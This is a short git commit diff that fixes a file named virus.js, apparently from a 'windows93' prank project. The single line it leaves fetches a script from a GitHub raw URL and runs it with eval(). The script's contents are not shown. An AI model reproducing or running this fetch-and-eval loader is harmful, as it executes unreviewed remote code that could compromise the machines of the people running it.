c166bfd6c3d3ea3542361a328292338166bab127
ivorydevrimoalt <154000627+ivorydevrimoalt@users.noreply.github.com>
2024-08-19 18:39:42 +0300

    Update virus.js

--- virus.js
+++ virus.js
@@ -1,1 +1,1 @@
-js fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/virus/part1.js').then(response => response.text()).then(script => eval(script));
+fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/virus/part1.js').then(response => response.text()).then(script => eval(script));
